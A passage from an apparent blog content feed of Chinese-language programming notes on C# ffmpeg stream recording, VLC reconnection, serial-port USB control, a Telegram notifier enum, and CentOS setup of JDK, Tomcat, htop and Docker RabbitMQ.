<h3 id="RTMP協定"><a href="#RTMP協定" class="headerlink" title="RTMP協定"></a>RTMP協定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private static string ffmpegPath = @<span class="string">&quot;.\ffmpeg\bin\ffmpeg.exe&quot;</span>;</span><br><span class="line">//開始轉檔</span><br><span class="line">public static void StartRecordMp4FromRtmp(string recordServer, string directoryPath, string saveRecordPath, ref Process process)</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!File.Exists(directoryPath))</span><br><span class="line">		&#123;</span><br><span class="line">			Directory.CreateDirectory(directoryPath);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (string.IsNullOrEmpty(recordServer))</span><br><span class="line">		&#123;</span><br><span class="line">			LogUtil.logger.Warn(<span class="string">&quot;Method:ImageUtil.StartRecordMp4 recordServer is null&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (string.IsNullOrEmpty(saveRecordPath))</span><br><span class="line">		&#123;</span><br><span class="line">			LogUtil.logger.Warn(<span class="string">&quot;Method:ImageUtil.StartRecordMp4 saveRecordPath is null&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (process == null)</span><br><span class="line">		&#123;</span><br><span class="line">			process = new Process();</span><br><span class="line">			process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">			process.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">			process.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">			process.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">			process.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">			process.Start();</span><br><span class="line">		&#125;</span><br><span class="line">		var cmdParams = ffmpegCompletePath + string.Format(<span class="string">&quot; -i &#123;0&#125; -f mp4 -c:v copy -c:a copy &#123;1&#125;&quot;</span>, recordServer, saveRecordPath);</span><br><span class="line">		process.StandardInput.WriteLine(cmdParams);</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox.Show(Convert.ToString(ex));</span><br><span class="line">		LogUtil.logger.Fatal(Convert.ToString(ex));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">//結束轉檔</span><br><span class="line">public static void StopRecordMp4(ref Process process)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (process == null)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Warn(<span class="string">&quot;Method:ImageUtil.StartRecordMp4 process is null&quot;</span>);</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	process.StandardInput.WriteLine(<span class="string">&quot;q&quot;</span>);</span><br><span class="line">	process.StandardInput.WriteLine(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">	process.Close();</span><br><span class="line">	process.Dispose();</span><br><span class="line">	process = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="RTSP協定"><a href="#RTSP協定" class="headerlink" title="RTSP協定"></a>RTSP協定</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private static string ffmpegPath = @<span class="string">&quot;.\ffmpeg\bin\ffmpeg.exe&quot;</span>;</span><br><span class="line">//開始轉檔</span><br><span class="line">public static void StartRecordMp4FromRtsp(string recordServer, string directoryPath, string saveRecordPath, ref Process process)</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (!File.Exists(directoryPath))</span><br><span class="line">		&#123;</span><br><span class="line">			Directory.CreateDirectory(directoryPath);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (string.IsNullOrEmpty(recordServer))</span><br><span class="line">		&#123;</span><br><span class="line">			LogUtil.logger.Warn(<span class="string">&quot;Method:ImageUtil.StartRecordMp4 recordServer is null&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (string.IsNullOrEmpty(saveRecordPath))</span><br><span class="line">		&#123;</span><br><span class="line">			LogUtil.logger.Warn(<span class="string">&quot;Method:ImageUtil.StartRecordMp4 saveRecordPath is null&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (process == null)</span><br><span class="line">		&#123;</span><br><span class="line">			process = new Process();</span><br><span class="line">			process.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">			process.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">			process.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">			process.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">			process.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">			process.Start();</span><br><span class="line">		&#125;</span><br><span class="line">		//RTSP來源必須是H.264格式</span><br><span class="line">		var cmdParams = ffmpegCompletePath + string.Format(<span class="string">&quot; -rtsp_transport tcp -i &#123;0&#125; -f mp4 -c:v copy -c:a copy -aspect 16:9 -movflags +faststart &#123;1&#125;&quot;</span>, recordServer, saveRecordPath);</span><br><span class="line">		process.StandardInput.WriteLine(cmdParams);</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox.Show(Convert.ToString(ex));</span><br><span class="line">		LogUtil.logger.Fatal(Convert.ToString(ex));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">//結束轉檔</span><br><span class="line">public static void StopRecordMp4(ref Process process)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (process == null)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Warn(<span class="string">&quot;Method:ImageUtil.StartRecordMp4 process is null&quot;</span>);</span><br><span class="line">		<span class="built_in">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	//q指令下了之後，通常要等幾秒mp4的結尾才會寫入!</span><br><span class="line">	//才可以對該mp4檔案操作，不然會發生檔案損毀0xc00d36c4錯誤。</span><br><span class="line">	process.StandardInput.WriteLine(<span class="string">&quot;q&quot;</span>);</span><br><span class="line">	process.StandardInput.WriteLine(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">	process.Close();</span><br><span class="line">	process.Dispose();</span><br><span class="line">	process = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>ffmpeg</tag>
        <tag>rtsp</tag>
        <tag>rtmp</tag>
        <tag>H.264</tag>
        <tag>MP4</tag>
      </tags>
  </entry>
  <entry>
    <title>C#判斷Encoder斷線VLC播放器重連</title>
    <url>/posts/ea9bbc99/</url>
    <content><![CDATA[<h3 id="C-判斷Encoder斷線VLC播放器重連"><a href="#C-判斷Encoder斷線VLC播放器重連" class="headerlink" title="C#判斷Encoder斷線VLC播放器重連"></a>C#判斷Encoder斷線VLC播放器重連</h3><span id="more"></span>
<p>從上篇C#使用Vlc64位元播放器By Vlc.DotNet:<br><span class="exturl" data-url="aHR0cHM6Ly9kYXZpZGNoZW4wMjE3LmdpdGh1Yi5pby8yMDE5LzEyLzIzL0MtU2hhcnAlRTQlQkQlQkYlRTclOTQlQThWTEM2NCVFNCVCRCU4RCVFNSU4NSU4MyVFNiU5MiVBRCVFNiU5NCVCRSVFNSU5OSVBOC8=">https://davidchen0217.github.io/2019/12/23/C-Sharp%E4%BD%BF%E7%94%A8VLC64%E4%BD%8D%E5%85%83%E6%92%AD%E6%94%BE%E5%99%A8/<i class="fa fa-external-link-alt"></i></span><br>可以使用VLC播放器播放RTSP、RTMP…串流。會有一種情境發生是源頭的Encoder重啟造成播放中暫停。<br>程式必須要新增判斷若斷線要重連</p>
<h3 id="斷線重連機制"><a href="#斷線重連機制" class="headerlink" title="斷線重連機制"></a>斷線重連機制</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (vlcControl1.IsPlaying)</span><br><span class="line">&#123;</span><br><span class="line">	vlcControl1.Refresh();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	vlcControl1.Play(new Uri(rtsp:\\10.10.1.12));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>Vlc.DotNet</tag>
        <tag>Encoder</tag>
      </tags>
  </entry>
  <entry>
    <title>C#使用PerformanceCounter查詢CPU與記憶體使用狀況</title>
    <url>/posts/f4ee45d7/</url>
    <content><![CDATA[<h3 id="C-使用PerformanceCounter查詢CPU與記憶體使用狀況"><a href="#C-使用PerformanceCounter查詢CPU與記憶體使用狀況" class="headerlink" title="C#使用PerformanceCounter查詢CPU與記憶體使用狀況"></a>C#使用PerformanceCounter查詢CPU與記憶體使用狀況</h3><span id="more"></span>
<p>最近有個需求是要監控多台windows電腦上的CPU和memory使用率。</p>
<h3 id="PerformanceCounter-example"><a href="#PerformanceCounter-example" class="headerlink" title="PerformanceCounter example"></a>PerformanceCounter example</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Diagnostics;</span><br><span class="line">using System.Threading;</span><br><span class="line"> </span><br><span class="line">namespace <span class="built_in">test</span></span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static PerformanceCounter cpu = new PerformanceCounter(<span class="string">&quot;Processor&quot;</span>, <span class="string">&quot;% Processor Time&quot;</span>, <span class="string">&quot;_Total&quot;</span>);</span><br><span class="line">        static PerformanceCounter memory = new PerformanceCounter(<span class="string">&quot;Memory&quot;</span>, <span class="string">&quot;% Committed Bytes in Use&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;CPU: &#123;0:n1&#125;%&quot;</span>, cpu.NextValue());</span><br><span class="line">                Console.WriteLine(<span class="string">&quot;Memory: &#123;0:n0&#125;%&quot;</span>, memory.NextValue());</span><br><span class="line">                Thread.Sleep(1000);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>PerformanceCounter</tag>
      </tags>
  </entry>
  <entry>
    <title>C#執行緒Thread發生例外處理Exception</title>
    <url>/posts/81d845e9/</url>
    <content><![CDATA[<h3 id="C-執行緒Thread發生例外處理Exception"><a href="#C-執行緒Thread發生例外處理Exception" class="headerlink" title="C#執行緒Thread發生例外處理Exception"></a>C#執行緒Thread發生例外處理Exception</h3><span id="more"></span>
<p>這篇介紹在C#上使用Thread需注意例外處理造成的程式閃退。</p>
<h3 id="會造成例外處理的case，若沒有C-a-txt檔案，程式會出錯並閃退。"><a href="#會造成例外處理的case，若沒有C-a-txt檔案，程式會出錯並閃退。" class="headerlink" title="會造成例外處理的case，若沒有C:\a.txt檔案，程式會出錯並閃退。"></a>會造成例外處理的case，若沒有C:\a.txt檔案，程式會出錯並閃退。</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">new Thread(FileCopy).start();</span><br><span class="line"></span><br><span class="line">private static <span class="function"><span class="title">FileCopy</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	File.Copy(<span class="string">&quot;C:\a.txt&quot;</span>, <span class="string">&quot;C:\b.txt&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">//檢查檔案存在才執行該執行緒</span><br><span class="line"><span class="keyword">if</span> (File.Exists(<span class="string">&quot;C:\a.txt&quot;</span>)) </span><br><span class="line">&#123;</span><br><span class="line">	new Thread(FileCopy).start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//加入try catch 並記錄<span class="built_in">log</span></span><br><span class="line">private static <span class="function"><span class="title">FileCopy</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		File.Copy(<span class="string">&quot;C:\a.txt&quot;</span>, <span class="string">&quot;C:\b.txt&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	catch(Exception ex) </span><br><span class="line">	&#123;</span><br><span class="line">		Console.WriteLine(Convert.toString(ex));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>Thread</tag>
        <tag>Exception</tag>
      </tags>
  </entry>
  <entry>
    <title>C#如何使用Java Enum</title>
    <url>/posts/4740fb6a/</url>
    <content><![CDATA[<h3 id="C-如何使用Java-Enum"><a href="#C-如何使用Java-Enum" class="headerlink" title="C#如何使用Java Enum"></a>C#如何使用Java Enum</h3><span id="more"></span>
<p>因C#與Java語言特性不同的關係，在enum的使用上有很大的不同。<br>這邊提供方法相同，但寫法不同的範例提供參考。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Java Enum example:</span><br><span class="line"></span><br><span class="line">package com.commons.type;</span><br><span class="line"></span><br><span class="line">import java.io.DataOutputStream;</span><br><span class="line">import java.net.HttpURLConnection;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLConnection;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import com.manager.ApacheHttpClientManager;</span><br><span class="line">import com.util.LogUtils;</span><br><span class="line"></span><br><span class="line">public enum TelegramBotType &#123;</span><br><span class="line"></span><br><span class="line">	Example(<span class="string">&quot;token_example&quot;</span>, <span class="string">&quot;chatid_example&quot;</span>);</span><br><span class="line"></span><br><span class="line">	private String token;</span><br><span class="line"></span><br><span class="line">	private String chatId;</span><br><span class="line"></span><br><span class="line">	private String messageUrl;</span><br><span class="line"></span><br><span class="line">	TelegramBotType(String token, String chatId) &#123;</span><br><span class="line">		this.token = token;</span><br><span class="line">		this.chatId = chatId;</span><br><span class="line">		this.messageUrl = <span class="string">&quot;https://api.telegram.org/bot&quot;</span> + token + <span class="string">&quot;/sendMessage&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	public void sendMessage(String msg, boolean isHTML) &#123;</span><br><span class="line">		// 如果沒有設定，改由log4j紀錄</span><br><span class="line">		<span class="keyword">if</span> (this.chatId == null || this.token == null || this.messageUrl == null) &#123;</span><br><span class="line">			LogUtils.telegramBot.info(<span class="string">&quot;Telegram &quot;</span> + this.name() + <span class="string">&quot; : &quot;</span> + msg);</span><br><span class="line">			<span class="built_in">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		try &#123;</span><br><span class="line">			ApacheHttpClientManager.HttpPostRequest httpPostRequest = ApacheHttpClientManager.getInstance()</span><br><span class="line">				.getHttpPostRequest(this.messageUrl);</span><br><span class="line"></span><br><span class="line">			Map&lt;String, String&gt; postParam = new HashMap&lt;&gt;();</span><br><span class="line">			postParam.put(<span class="string">&quot;chat_id&quot;</span>, chatId);</span><br><span class="line">			postParam.put(<span class="string">&quot;text&quot;</span>, msg);</span><br><span class="line">			<span class="keyword">if</span> (isHTML) &#123;</span><br><span class="line">				postParam.put(<span class="string">&quot;parse_mode&quot;</span>, <span class="string">&quot;HTML&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			httpPostRequest.setParameters(postParam);</span><br><span class="line">			ApacheHttpClientManager.getInstance().execute(httpPostRequest);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			LogUtils.telegramBot.error(<span class="string">&quot;failure message transmission msg:&quot;</span> + msg + <span class="string">&quot;, isHTML:&quot;</span> + isHTML, e);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">C<span class="comment"># Enum example:</span></span><br><span class="line"></span><br><span class="line">using Example.Source.Net.com.util;</span><br><span class="line">using System;</span><br><span class="line">using System.Collections.Specialized;</span><br><span class="line"></span><br><span class="line">namespace Example.Source.Net.com.commons.type</span><br><span class="line">&#123;</span><br><span class="line">    public sealed class TelegramBotType</span><br><span class="line">    &#123;</span><br><span class="line">        private <span class="built_in">readonly</span> string token;</span><br><span class="line">        private <span class="built_in">readonly</span> string chatId;</span><br><span class="line">        private <span class="built_in">readonly</span> string messageUrl;</span><br><span class="line"></span><br><span class="line">        public static <span class="built_in">readonly</span> TelegramBotType Example = new TelegramBotType(<span class="string">&quot;token_example&quot;</span>, <span class="string">&quot;chatid_example&quot;</span>);</span><br><span class="line"></span><br><span class="line">        private TelegramBotType(string token, string chatId)</span><br><span class="line">        &#123;</span><br><span class="line">            this.token = token;</span><br><span class="line">            this.chatId = chatId;</span><br><span class="line">            messageUrl = <span class="string">&quot;https://api.telegram.org/bot&quot;</span> + token + <span class="string">&quot;/sendMessage&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void sendMessage(string msg, int <span class="built_in">timeout</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            // 如果沒有設定，改由log4j紀錄</span><br><span class="line">            <span class="keyword">if</span> (chatId == null || token == null || messageUrl == null)</span><br><span class="line">            &#123;</span><br><span class="line">                LogUtil.logger.Warn(<span class="string">&quot;No Telegram Setting : &quot;</span> + msg);</span><br><span class="line">                <span class="built_in">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            try</span><br><span class="line">            &#123;</span><br><span class="line">                var values = new NameValueCollection</span><br><span class="line">                &#123;</span><br><span class="line">                    &#123;<span class="string">&quot;chat_id&quot;</span>,  chatId&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;text&quot;</span>,  msg&#125;</span><br><span class="line">                &#125;;</span><br><span class="line">                ApiServiceUtil.POST(messageUrl, values, <span class="built_in">timeout</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            catch (Exception e)</span><br><span class="line">            &#123;</span><br><span class="line">                LogUtil.logger.Error(<span class="string">&quot;failure message transmission msg:&quot;</span> + msg + <span class="string">&quot;;&quot;</span> + Convert.ToString(e));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>Java</tag>
        <tag>Enum</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7安裝Jdk和Tomcat</title>
    <url>/posts/8974fa5e/</url>
    <content><![CDATA[<h3 id="CentOS7安裝Jdk和Tomcat"><a href="#CentOS7安裝Jdk和Tomcat" class="headerlink" title="CentOS7安裝Jdk和Tomcat"></a>CentOS7安裝Jdk和Tomcat</h3><span id="more"></span>
<p>Step1: 將jdk版本解壓縮至 &#x2F;usr&#x2F;local&#x2F;java 下<br>Step2: </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ln</span> -s jdk1.8.0_181 latest</span><br></pre></td></tr></table></figure>
<p>Step3: 將apache-tomcat版本解壓縮至 &#x2F;usr&#x2F;local 下<br>Step4: </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ln</span> -s apache-tomcat uat_tomcat</span><br></pre></td></tr></table></figure>
<p>Step5: 改正確時區 timedatectl set-timezone Asia&#x2F;Taipei</p>
]]></content>
      <categories>
        <category>CentOS7</category>
      </categories>
      <tags>
        <tag>CentOS7</tag>
        <tag>JDK</tag>
        <tag>Tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>C#使用SerialPort協定控制USB開關</title>
    <url>/posts/9ec91d0e/</url>
    <content><![CDATA[<h3 id="C-使用SerialPort協定控制USB開關"><a href="#C-使用SerialPort協定控制USB開關" class="headerlink" title="C#使用SerialPort協定控制USB開關"></a>C#使用SerialPort協定控制USB開關</h3><span id="more"></span>
<p>這篇文章介紹如何使用SerialPort來控制市售的USB開關。</p>
<h3 id="SerialPort-Initial"><a href="#SerialPort-Initial" class="headerlink" title="SerialPort Initial"></a>SerialPort Initial</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private SerialPort barcode = null;</span><br><span class="line">private enum BaudRate</span><br><span class="line">&#123;</span><br><span class="line">	BO_9600,</span><br><span class="line">	BO_19200,</span><br><span class="line">	BO_38400,</span><br><span class="line">	BO_57600,</span><br><span class="line">	BO_115200</span><br><span class="line">&#125;;</span><br><span class="line">public bool Init(int comPort, BaudRate baudRate)</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		var comportName = string.Format(@<span class="string">&quot;COM&#123;0&#125;&quot;</span>, comPort);</span><br><span class="line">		<span class="keyword">if</span> (barcode != null &amp;&amp; barcode.IsOpen)</span><br><span class="line">		&#123;</span><br><span class="line">			barcode.Close();</span><br><span class="line">		&#125;</span><br><span class="line">		barcode = new SerialPort</span><br><span class="line">		&#123;</span><br><span class="line">			PortName = comportName</span><br><span class="line">		&#125;;</span><br><span class="line">		switch (baudRate)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> BaudRate.BO_9600:</span><br><span class="line">				barcode.BaudRate = 9600;</span><br><span class="line">				<span class="built_in">break</span>;</span><br><span class="line">			<span class="keyword">case</span> BaudRate.BO_19200:</span><br><span class="line">				barcode.BaudRate = 19200;</span><br><span class="line">				<span class="built_in">break</span>;</span><br><span class="line">			<span class="keyword">case</span> BaudRate.BO_38400:</span><br><span class="line">				barcode.BaudRate = 38400;</span><br><span class="line">				<span class="built_in">break</span>;</span><br><span class="line">			<span class="keyword">case</span> BaudRate.BO_57600:</span><br><span class="line">				barcode.BaudRate = 57600;</span><br><span class="line">				<span class="built_in">break</span>;</span><br><span class="line">			<span class="keyword">case</span> BaudRate.BO_115200:</span><br><span class="line">				barcode.BaudRate = 115200;</span><br><span class="line">				<span class="built_in">break</span>;</span><br><span class="line">			default:</span><br><span class="line">				barcode.BaudRate = 19200;</span><br><span class="line">				<span class="built_in">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		barcode.Parity = Parity.None;</span><br><span class="line">		barcode.DataBits = 8;</span><br><span class="line">		barcode.StopBits = StopBits.One;</span><br><span class="line">		barcode.ReadBufferSize = 1024;</span><br><span class="line">		barcode.WriteBufferSize = 1024;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!barcode.IsOpen)</span><br><span class="line">		&#123;</span><br><span class="line">			try</span><br><span class="line">			&#123;</span><br><span class="line">				barcode.Open();</span><br><span class="line">			&#125;</span><br><span class="line">			catch (Exception ex)</span><br><span class="line">			&#123;</span><br><span class="line">				LogUtil.logger.Error(Convert.ToString(ex));</span><br><span class="line">				barcode = null;</span><br><span class="line">				<span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Fatal(Convert.ToString(ex));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="SerialPort-Write-to-USB"><a href="#SerialPort-Write-to-USB" class="headerlink" title="SerialPort Write to USB"></a>SerialPort Write to USB</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">private byte[] usbOpen = new byte[] &#123; 0xA0, 0x01, 0x01, 0xA2 &#125;;</span><br><span class="line">private byte[] usbClose = new byte[] &#123; 0xA0, 0x01, 0x00, 0xA1 &#125;;</span><br><span class="line">public void WriteByteToUsbLcus(bool isOpen)</span><br><span class="line">&#123;</span><br><span class="line">	try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (barcode == null || barcode.IsOpen == <span class="literal">false</span>)</span><br><span class="line">			<span class="built_in">return</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (isOpen)</span><br><span class="line">		&#123;</span><br><span class="line">			barcode.Write(usbOpen, 0, usbOpen.Length);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			barcode.Write(usbClose, 0, usbClose.Length);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	catch (Exception ex)</span><br><span class="line">	&#123;</span><br><span class="line">		LogUtil.logger.Fatal(Convert.ToString(ex));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CSharp</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
        <tag>SerialPort</tag>
        <tag>USB</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS How to Install htop To Monitor CPU Cores</title>
    <url>/posts/72bb0ec0/</url>
    <content><![CDATA[<h3 id="CentOS-How-to-Install-htop-To-Monitor-CPU-Cores"><a href="#CentOS-How-to-Install-htop-To-Monitor-CPU-Cores" class="headerlink" title="CentOS How to Install htop To Monitor CPU Cores"></a>CentOS How to Install htop To Monitor CPU Cores</h3><span id="more"></span>
<p>這篇介紹CentOS How to Install htop To Monitor CPU Cores。</p>
<h3 id="安裝指令"><a href="#安裝指令" class="headerlink" title="安裝指令"></a>安裝指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">若在 CentOS Linux 中，可用 yum 安裝 htop，首先啟用 EPEL 套件庫：</span><br><span class="line">$ sudo yum install epel-release</span><br><span class="line">$ sudo yum update</span><br><span class="line"></span><br><span class="line">再來安裝 htop 套件:</span><br><span class="line">$ sudo yum install htop</span><br></pre></td></tr></table></figure>

<h3 id="執行指令"><a href="#執行指令" class="headerlink" title="執行指令"></a>執行指令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ htop</span><br></pre></td></tr></table></figure>

<h3 id="顯示畫面"><a href="#顯示畫面" class="headerlink" title="顯示畫面"></a>顯示畫面</h3><img data-src="https://raw.githubusercontent.com/davidchen0217/davidchen0217.github.io/master/images/htop.PNG" width="100%" />
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">CPU:14cores</span><br><span class="line">RAM:28G</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>CentOS</tag>
        <tag>CPU</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7安裝docker RabbitMQ</title>
    <url>/posts/27b5d2f3/</url>
    <content><![CDATA[<h3 id="CentOS7安裝docker-RabbitMQ"><a href="#CentOS7安裝docker-RabbitMQ" class="headerlink" title="CentOS7安裝docker RabbitMQ"></a>CentOS7安裝docker RabbitMQ</h3><span id="more"></span>
<p>Step1:CentOS7 系統 CentOS-Extras 庫中已內建 Docker，可以直接安裝：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo yum install docker</span><br></pre></td></tr></table></figure>
<p>Step2:安裝之後啟動 Docker 服務，並讓它隨系統啟動自動載入。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sudo service docker start</span><br><span class="line">$ sudo chkconfig docker on</span><br></pre></td></tr></table></figure>
<p>Step3:將解壓縮後的docker資料夾放 &#x2F;opt 下<br>Step4:&#x2F;opt&#x2F;docker&#x2F;dockerfile下需要有passwd.template 和 run-rabbitmq-server.sh 兩個檔案</p>
<p>Step5:執行 &#x2F;opt&#x2F;docker&#x2F;command</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ sh create-rabbitmq.sh</span><br></pre></td></tr></table></figure>
<p>Step6:以下三行指令必須在 &#x2F;opt&#x2F;docker&#x2F;dockerfile下執行才能成功</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker build -f /opt/docker/dockerfile/rabbitmq -t rabbitmq:00 .</span><br><span class="line">$ docker tag [IMAGE ID] rabbitmq:00</span><br><span class="line"></span><br><span class="line">$ docker run -itd --name rabbitMQ --privileged --net mynetwork --ip 172.18.0.10 --restart always -p 4369:4369 -p 5672:5672 -p 15672:15672 -p 25672:25672 rabbitmq:00</span><br></pre></td></tr></table></figure>
<p>Step7:172.18.0.10:15672 有 rabbitMQ 登入畫面即成功</p>
]]></content>
      <categories>
        <category>CentOS7</category>
      </categories>
      <tags>
        <tag>CentOS7</tag>
        <tag>Docker</tag>
        <tag>RabbitMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS設定TimeZone</title>
    <url>/posts/303e660c/</url>
    <content><![CDATA[<h3 id="CentOS設定TimeZone"><a href="#CentOS設定TimeZone" class="headerlink" title="CentOS設定TimeZone"></a>CentOS設定TimeZone</h3><span id="more"></span>
<p>先查看CentOS上目前TimeZone</p>
